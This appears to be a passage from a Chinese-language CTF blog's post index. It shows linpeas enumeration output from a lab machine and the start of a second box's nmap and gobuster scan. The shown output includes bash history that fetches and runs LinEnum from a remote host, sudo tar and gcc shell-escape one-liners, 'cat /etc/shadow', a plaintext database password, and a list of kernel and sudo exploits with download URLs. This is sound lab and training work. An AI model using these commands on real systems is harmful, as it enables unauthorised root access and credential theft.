/home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001 Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/storage.sqlite: SQLite 3.x database, user version 131075, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/webappsstore.sqlite: SQLite 3.x database, user version 2, last written using SQLite version 3031001\rFound /snap/core/7270/lib/firmware/regulatory.db: CRDA wireless regulatory database file\rFound /snap/core/7917/lib/firmware/regulatory.db: CRDA wireless regulatory database file\rFound /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3022000\rFound /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3022000\rFound /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3022000\rFound /var/lib/mlocate/mlocate.db: regular file, no read permission\rFound /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3022000\r-\u0026gt; Extracting tables from /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/OfflineCache/index.sqlite (limit 20) -\u0026gt; Extracting tables from /home/love/.local/share/evolution/addressbook/system/contacts.db (limit 20) --\u0026gt; Found interesting column names in folder_id_email_list (output limit 10) CREATE TABLE \u0026#39;folder_id_email_list\u0026#39; (uid TEXT NOT NULL REFERENCES \u0026#39;folder_id\u0026#39; (uid), value TEXT) -\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/cert9.db (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/content-prefs.sqlite (limit 20) -\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/cookies.sqlite (limit 20) -\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/favicons.sqlite (limit 20) --\u0026gt; Found interesting column names in moz_icons (output limit 10) CREATE TABLE moz_icons ( id INTEGER PRIMARY KEY, icon_url TEXT NOT NULL, fixed_icon_url_hash INTEGER NOT NULL, width INTEGER NOT NULL DEFAULT 0, root INTEGER NOT NULL DEFAULT 0, color INTEGER, expire_ms INTEGER NOT NULL DEFAULT 0, data BLOB )\r1, fake-favicon-uri:https://support.mozilla.org/en-US/products/firefox, 136572340459075, 32, 0, None, 1586435128207, �PNG\r▒\rIHDR szz�gAMA��\r�a cHRMz\u0026amp;�����u0�`:�p��Q\u0026lt;bKGD�C� pHYs\r��~�tIME�\r1�-▒7��p #,\\ VIDATXí�y�_U�?������~�,�����-K����X�\rF��\u0026#34;�▒5DkX$bk�X)���@��C���o}�]���k˦Q�K���%���9��s�����*��]Bȳˑ\\D�m������\r�R��r)��+��`�_!���aV����Oy��o#��g��\u0026amp;TJk���44���\u0026gt;�\u0026lt;�an���@I�;�H1��m�(�Z����ne�r�\\��� ��D�=��j���ŤL�XA+$4���{�дZ:�f\u0026amp;�+�Sԉ�}��%�P`.���t▒^:v�4��m�n#�۽Do��JLZ��Sh �`���,uӂ 舉�cDzL�����u?����E��\u0026#34;���W\u0026#39;C��g�]�M��Pz�\u0026gt;�b���\u0026#39;�P��.~�}�s£���\rB�D�#S�kT{�w����=s�/y▒@��#+�$^n)���eI�=.Na$�$���\u0026gt;��K�:���0�YN��,���,����X�▒E�.���o\u0026amp;G��©5���נg_%Sһ`���%U��}���_/w )�N�U`ao�t����~��)�!�\u0026gt;��,ə���������^E][����]\\���f�I,T-T��j�p^o�M��y��6�34���:\r\u0026#34;r_�Z�k��▒#▒�@8D�xX\u0026lt;�KUY��s��GVDޛL(\u0026lt;\u0026#34;�\r=3�gv~�ĥ\\��Wh�����N���XBx}���E���H]t2��$}zږ��s��G��l�W��▒�Z�U��|���\u0026#34;��\\~�u����]��\rL�L�?�Ԓ��C�A���,\u0026#34;�w\r�v���ݼ�\u0026lt;3�����J\rH-d�c�$�y�▒gj�:\r��!_k*V�|gC8���;�:}��\u0026gt;(\u0026lt;\r�� ���\r��5��5l��c\u0026gt;▒��6�T ��ʄ\u0026#34;�ȁQ� ������j6�mȦ!���u�����\u0026#39;�`~�����J���k���+pB�F,�����[S�ٽ�P�PIZh�9r�S�e|��@ �^�i���j*(C4�G,K\u0026gt;����D�k��\u0026#34;p w�-\\lr+��Aq�EpO����XC��a��������v\u0026gt;�p�P�BQ2);�\u0026lt;����[��?.���*jՂ3�Ri��\\8���K�o\\*�c\u0026#34;\u0026gt;2(`@(�\r���a�\u0026amp;��:��.#KZ�j��|��w񓝗�|P,������ \u0026lt;P\rR٦� ▒��h�\r�y�\r�7w�B��K\rc�!r▒����P,� T��t�\u0026lt;��ydn [g��=�S�,�\u0026#34;��׾����E�\u0026gt;�r i�9�%�.��܉���q�{��!�Q�aS�w��u�H.��DʮL�ghkQ=�#.����p{9�Us��kΝ�;��t7*\r\u0026#39;��������Ac)�L������a���|���aU�▒4�����HȬS77�m�7����?�����6��;F��g/��3T\u0026gt;F5nERϡ��P�]b���옛��n���mr��=\\��A��u��.\r--\u0026gt; Found interesting column names in moz_pages_w_icons (output limit 10)\rCREATE TABLE moz_pages_w_icons ( id INTEGER PRIMARY KEY, page_url TEXT NOT NULL, page_url_hash INTEGER NOT NULL ) 1, https://support.mozilla.org/en-US/products/firefox, 47357795150914\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/formhistory.sqlite (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/key4.db (limit 20) -\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/permissions.sqlite (limit 20) -\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/places.sqlite (limit 20) --\u0026gt; Found interesting column names in moz_places (output limit 10) CREATE TABLE moz_places ( id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR, rev_host LONGVARCHAR, visit_count INTEGER DEFAULT 0, hidden INTEGER DEFAULT 0 NOT NULL, typed INTEGER DEFAULT 0 NOT NULL, frecency INTEGER DEFAULT -1 NOT NULL, last_visit_date INTEGER , guid TEXT, foreign_count INTEGER DEFAULT 0 NOT NULL, url_hash INTEGER DEFAULT 0 NOT NULL , description TEXT, preview_image_url TEXT, origin_id INTEGER REFERENCES moz_origins(id))\r1, https://support.mozilla.org/en-US/products/firefox, None, gro.allizom.troppus., 0, 0, 0, 137, None, oVrI_xtQb0lb, 1, 47357795150914, None, None, 1\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/protections.sqlite (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/https+++www.google.com/idb/548905059db.sqlite (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/https+++www.serv-u.com/idb/3808187126SBWD_.sqlite (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/moz-extension+++d53c4cd4-0510-4e77-8a00-5abe770f51a8^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite (limit 20)\r-\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/storage.sqlite (limit 20) -\u0026gt; Extracting tables from /home/love/.mozilla/firefox/y55nwd4d.default-release/webappsstore.sqlite (limit 20) -\u0026gt; Extracting tables from /var/lib/colord/mapping.db (limit 20) -\u0026gt; Extracting tables from /var/lib/colord/storage.db (limit 20) -\u0026gt; Extracting tables from /var/lib/fwupd/pending.db (limit 20) -\u0026gt; Extracting tables from /var/lib/PackageKit/transactions.db (limit 20) ╔══════════╣ Web files?(output limit)\r/var/www/: total 24K\rdrwxrwxr-x 4 www-data www-data 4.0K Oct 21 2019 .\rdrwxr-xr-x 15 www-data www-data 4.0K Oct 20 2019 ..\r-rwxrwxr-x 1 www-data www-data 6.4K May 27 2020 .bash_history\rdrwxrwxrwx 3 www-data www-data 4.0K May 27 2020 html\rdrwxrwxr-x 3 www-data www-data 4.0K Oct 21 2019 .local\r/var/www/html:\rtotal 32K\r╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)\r-rw-r--r-- 1 root root 77 Feb 18 04:12 /usr/local/Serv-U/.Serv-U.conf -rw-r--r-- 1 root root 0 Feb 19 2019 /usr/share/php/.lock\r-rw------- 1 root root 0 Aug 6 2019 /etc/.pwd.lock\r-rw-r--r-- 1 root root 1913 Apr 2 2020 /etc/apparmor.d/cache/.features\r-rw-r--r-- 1 root root 220 Apr 5 2018 /etc/skel/.bash_logout\r-rwxrwxrwx 1 www-data www-data 83 Apr 3 2020 /var/www/html/election/.htaccess\r-rw------- 1 gdm gdm 14364 Feb 18 04:12 /var/lib/gdm3/.ICEauthority\r-rw-r--r-- 1 root root 1913 Apr 2 2020 /var/cache/apparmor/.features\r-rwxrwxrwx 1 love love 66 Oct 20 2019 /home/love/.selected_editor\r-rwxrwxrwx 1 love love 10534 Jun 16 2022 /home/love/.ICEauthority\r-rw-rw-r-- 1 love love 83 May 26 2020 /home/love/.Serv-U-Tray.conf\r-rw------- 1 root root 0 Oct 1 2019 /snap/core/7917/etc/.pwd.lock\r-rw-r--r-- 1 root root 220 Sep 1 2015 /snap/core/7917/etc/skel/.bash_logout\r-rw------- 1 root root 0 Jun 21 2019 /snap/core/7270/etc/.pwd.lock\r-rw-r--r-- 1 root root 220 Sep 1 2015 /snap/core/7270/etc/skel/.bash_logout\r-rw------- 1 root root 0 Jul 9 2019 /snap/core18/1066/etc/.pwd.lock\r-rw-r--r-- 1 root root 220 Apr 5 2018 /snap/core18/1066/etc/skel/.bash_logout\r-rw------- 1 root root 0 Oct 10 2019 /snap/core18/1223/etc/.pwd.lock\r-rw-r--r-- 1 root root 220 Apr 5 2018 /snap/core18/1223/etc/skel/.bash_logout\r-rw-r--r-- 1 root root 0 Feb 18 04:12 /run/network/.ifstate.lock\r╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70) -rw-rw-rw- 1 root root 1184 May 15 20:55 /var/tmp/Serv-U-Engine-Tray-SharedMemory -rw-r--r-- 1 root root 3667 Apr 3 2020 /var/backups/alternatives.tar.2.gz\r-rw-r--r-- 1 www-data www-data 11 Oct 20 2019 /var/backups/dpkg.arch.0\r-rw-r--r-- 1 root root 81920 Jun 16 2022 /var/backups/alternatives.tar.0\r-rw-r--r-- 1 www-data www-data 3362 Oct 20 2019 /var/backups/alternatives.tar.4.gz\r-rw-r--r-- 1 www-data www-data 43 Oct 20 2019 /var/backups/dpkg.arch.1.gz\r-rw-r--r-- 1 www-data www-data 43 Oct 20 2019 /var/backups/dpkg.arch.3.gz\r-rw-r--r-- 1 www-data www-data 43 Oct 20 2019 /var/backups/dpkg.arch.6.gz\r-rw-r--r-- 1 www-data www-data 43 Oct 20 2019 /var/backups/dpkg.arch.5.gz\r-rw-r--r-- 1 root root 3552 Oct 21 2019 /var/backups/alternatives.tar.3.gz\r-rw-r--r-- 1 root root 3668 Apr 8 2020 /var/backups/alternatives.tar.1.gz\r-rw-r--r-- 1 www-data www-data 43 Oct 20 2019 /var/backups/dpkg.arch.2.gz\r-rw-r--r-- 1 www-data www-data 43 Oct 20 2019 /var/backups/dpkg.arch.4.gz\r╔══════════╣ Searching passwords in history files\rsu - su -\rsu -\rssh root@127.0.0.1\rpkexec users-admin\rsu -\rBinary file /usr/share/phpmyadmin/js/openlayers/theme/default/img/navigation_history.png matches\rsudo su\rcat /etc/shadow\rcat /etc/passwd\rsu love\rsu love\rwget http://192.168.1.8:8000/linenum.sh\rchmod +x linenum.sh\r./linenum.sh\rcd root\rsudo su\r./LinEnum.sh\r./LinEnum.sh -h\r./LinEnum.sh -t\r./LinEnum.sh -t | grep logrotate\r./LinEnum.sh -t\rsudo -l\rsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\rsudo gcc -wrapper /bin/sh,-s .\rmysql -u root -p\rwget http://192.168.1.5:8000/LinEnum.sh\rchmod +x LinEnum.sh\r./LinEnum.sh\rsudo -E wget $URL -O $LFILE\r./LinEnum.sh\rsudo su\rsudo su\rcd root\rsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\rwget http://192.168.1.5:8000/LinEnum.sh\rchmod +x LinEnum.sh\r./LinEnum.sh\rcd root\rsu love\rsu love\rsu love\rsu love\r╔══════════╣ Searching passwords in config PHP files\r$dbpass=\u0026#39;toor\u0026#39;; $dbuser=\u0026#39;phpmyadmin\u0026#39;;\r// $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;AllowNoPassword\u0026#39;] = TRUE;\r// $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;AllowNoPassword\u0026#39;] = TRUE;\r$cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;AllowNoPassword\u0026#39;] = false;\r$cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;AllowNoPassword\u0026#39;] = false;\r$cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;nopassword\u0026#39;] = false;\r$cfg[\u0026#39;ShowChgPassword\u0026#39;] = true;\r╔══════════╣ Searching *password* or *credential* files in home (limit 70)\r/bin/systemd-ask-password /bin/systemd-tty-ask-password-agent\r/etc/brlapi.key\r/etc/pam.d/common-password\r/etc/pam.d/gdm-password\r╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs\r╔══════════╣ Searching passwords inside logs (limit 70)\rbase-passwd depends on libc6 (\u0026gt;= 2.8); however: base-passwd depends on libdebconfclient0 (\u0026gt;= 0.145); however:\rBinary file /var/log/apache2/access.log.3.gz matches\rBinary file /var/log/apache2/access.log.6.gz matches\rBinary file /var/log/apache2/error.log.4.gz matches\rBinary file /var/log/auth.log.1 matches\rBinary file /var/log/installer/initial-status.gz matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955a86b2304e-fb5e4a94ae81d419.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955d1821d9b0-bdc429cc02d5846a.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955db7e2ea2b-3c8e4f639b5032e9.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955dca6c008f-ba973a02d0276859.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955dea1149ee-83859cee03624b28.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005955df2e276d1-4a8972c86942b82e.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a2504a9c9dfc-d920275ea813eebd.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a250630e8c31-468fab4ccdbf5db1.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a2c6c7dda5ef-564c95955a1d118b.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a64d25e5c551-bf175211d31968b6.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a68a601fd41b-36fc6ef69d74b47a.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a68a8c25529c-251bf606cc5785dd.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a68afc42f982-355c4e26606e3124.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005a69e8295f317-daefe53c31dc22c3.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005e1917a10f54b-2ae969afa7ba9e00.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005f4c256eaa0a8-5e776725ebc498fe.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system@0005f4ed05ec4d47-eb89097e891d4578.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system.journal matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/user-1000@0005a68a67c8072e-f753d07b43cf9073.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/user-1000@0005a68a9206cbff-e5caa186c537073a.journal~ matches\rBinary file /var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/user-1000.journal matches\rBinary file /var/log/syslog.1 matches\rdpkg: base-passwd: dependency problems, but configuring anyway as you requested:\rOct 20 20:06:15 love systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.\rOct 20 20:07:26 love gdm-password]: pam_unix(gdm-password:session): session opened for user love by (uid=0)\rOct 20 20:07:29 love /usr/lib/gdm3/gdm-x-session[1288]: dbus-update-activation-environment: setting PWD=/home/love\rOct 20 20:27:20 love gdm-password]: gkr-pam: unlocked login keyring\rOct 20 20:27:20 love gnome-keyring-daemon[1284]: couldn\u0026#39;t initialize slot with master password: The password or PIN is incorrect\rOct 20 20:29:04 love sudo: love : TTY=pts/1 ; PWD=/home/love ; USER=root ; COMMAND=/usr/bin/apt update\rOct 20 20:30:15 love kernel: [ 6.505551] systemd[1]: Started Forward Password Requests to Wall Directory Watch.\rOct 20 20:30:15 love systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.\rOct 20 20:31:10 love gdm-password]: pam_unix(gdm-password:auth): authentication failure; logname= uid=0 euid=0 tty=/dev/tty1 ruser= rhost= user=love\rOct 20 20:31:16 love gdm-password]: pam_unix(gdm-password:session): session opened for user love by (uid=0)\rOct 20 20:31:19 love /usr/lib/gdm3/gdm-x-session[1211]: dbus-update-activation-environment: setting PWD=/home/love\rOct 20 20:31:41 love sudo: love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/usr/bin/apt install apache2\rOct 20 20:34:42 love sudo: love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl stop apache2.service\rOct 20 20:34:46 love sudo: love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl start apache2.service\rOct 20 20:34:51 love sudo: love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl enable apache2.service\rOct 20 20:34:54 love sudo: love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/usr/bin/apt-get install mariadb-server mariadb-client -y\rOct 20 20:36:31 love chage[3891]: changed password expiry for mysql\rOct 20 20:39:28 love sudo: love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl stop mariadb.service\rOct 20 20:39:36 love sudo: love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl start mariadb.service\rOct 20 20:39:46 love sudo: love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl enable mariadb.service\rOct 20 20:40:33 love sudo: love : TTY=pts/0 ; PWD=/home/love/Desktop ; USER=root ; COMMAND=/bin/mv sar2HTML/ /var/www/html/\rOct 20 20:42:30 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/rm index.php LICENSE sar2html\rOct 20 20:42:42 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/rm -rf sarFILE/\rOct 20 20:42:54 love sudo: love : TTY=pts/0 ; PWD=/var/www/html/sar2HTML ; USER=root ; COMMAND=/usr/bin/apt install net-tools\rOct 20 20:43:14 love sudo: love : TTY=pts/0 ; PWD=/var/www/html/sar2HTML ; USER=root ; COMMAND=/usr/bin/apt install curl\rOct 20 20:44:40 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chown -R www-data:www-data /var/www/html/sar2HTML/\rOct 20 20:44:49 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chmod -R 755 /var/www/html/sar2HTML/\rOct 20 20:45:30 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl stop apache2.service\rOct 20 20:45:33 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl start apache2.service\rOct 20 20:45:37 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl enable apache2.service\rOct 20 20:46:24 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/rm -rf sar2HTML/\rOct 20 20:46:38 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl stop apache2.service\rOct 20 20:47:27 love sudo: love : TTY=pts/0 ; PWD=/home/love/Documents ; USER=root ; COMMAND=/bin/mv sar2HTML/ /var/www/html/\rOct 20 20:47:39 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chown -R www-data:www-data /var/www/html/sar2HTML/\rOct 20 20:47:48 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chmod -R 755 /var/www/html/sar2HTML/\rOct 20 20:48:01 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl restart apache2.service\rOct 20 20:48:06 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl status apache2.service\rOct 20 20:49:05 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/mysql_secure_installation\rOct 20 20:49:33 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/mysql_secure_installation\rOct 20 20:49:52 love sudo: love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/apt-get install software-properties-common\r╔════════════════╗\r════════════════════════════════╣ API Keys Regex ╠════════════════════════════════ ╚════════════════╝ Regexes to search for API keys aren\u0026#39;t activated, use param \u0026#39;-r\u0026#39; 列出了一些用于提权的内核漏洞\n╔══════════╣ Executing Linux Exploit Suggester\r╚ https://github.com/mzet-/linux-exploit-suggester [+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\rExposure: probable\rTags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro\rDownload URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main\r[+] [CVE-2021-3156] sudo Baron Samedit\rDetails: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt\rExposure: probable\rTags: mint=19,[ ubuntu=18|20 ], debian=10\rDownload URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main\r[+] [CVE-2021-3156] sudo Baron Samedit 2\rDetails: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt\rExposure: probable\rTags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10\rDownload URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main\r[+] [CVE-2020-9470] Wing FTP Server \u0026lt;= 6.2.5 LPE\rDetails: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.php\rExposure: probable\rTags: [ ubuntu=18 ]\rDownload URL: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.sh\rComments: Requires an administrator to login via the web interface.\r[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)\rDetails: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/\rhttps://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/\rExposure: less probable\rTags: ubuntu=(22.04){kernel:5.15.0-27-generic}\rDownload URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c\rComments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)\r[+] [CVE-2022-2586] nft_object UAF\rDetails: https://www.openwall.com/lists/oss-security/2022/08/29/5\rExposure: less probable\rTags: ubuntu=(20.04){kernel:5.12.13}\rDownload URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1\rComments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)\r[+] [CVE-2021-22555] Netfilter heap out-of-bounds write\rDetails: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html\rExposure: less probable\rTags: ubuntu=20.04{kernel:5.8.0-*}\rDownload URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\rext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c\rComments: ip_tables kernel module must be loaded\r[+] [CVE-2019-18634] sudo pwfeedback\rDetails: https://dylankatz.com/Analysis-of-CVE-2019-18634/\rExposure: less probable\rTags: mint=19\rDownload URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c\rComments: sudo configuration requires pwfeedback to be enabled.\r[+] [CVE-2019-12181] Serv-U FTP Server\rDetails: https://blog.vastart.dev/2019/06/cve-2019-12181-serv-u-exploit-writeup.html\rExposure: less probable\rTags: debian=9\rDownload URL: https://raw.githubusercontent.com/guywhataguy/CVE-2019-12181/master/servu-pe-cve-2019-12181.c\rext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-12181/SUroot\rComments: Modified version at \u0026#39;ext-url\u0026#39; uses bash exec technique, rather than compiling with gcc.\r[+] [CVE-2017-0358] ntfs-3g-modprobe\rDetails: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072\rExposure: less probable\rTags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}\rDownload URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip\rComments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores. 上传cve-2021-4034\n","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/election1/","summary":"┌──(root💀Chinchin)-[~/桌面] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.213.211 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 21:50 CST Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 1.66% done; ETC: 21:50 (0:00:00","title":""},{"content":"nmap -sS -sV -A -p- --min-rate 5000 192.168.183.111 ┌──(root㉿kali)-[~/桌面/vpn]\r└─# gobuster dir -u http://192.168.183.111/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -x php,txt,log,conf\r===============================================================\rGobuster v3.5\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.183.111/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.5\r[+] Extensions: txt,log,conf,php\r[+] Expanded: true\r[+] Timeout: 10s\r===============================================================\r2023/05/06 10:46:09 Starting gobuster in directory enumeration mode\r===============================================================\rhttp://192.168.183.111/.php (Status: 403) [Size: 280]\rhttp://192.168.183.111/index.php (Status: 200) [Size: 3468]\rhttp://192.168.183.111/profile.php (Status: 302) [Size: 7247] [--\u0026gt; http://192.168.183.111/index.php] http://192.168.183.111/header.php (Status: 200) [Size: 1666]\rhttp://192.168.183.111/store (Status: 301) [Size: 318] [--\u0026gt; http://192.168.183.111/store/] http://192.168.183.111/admin (Status: 301) [Size: 318] [--\u0026gt; http://192.168.183.111/admin/] 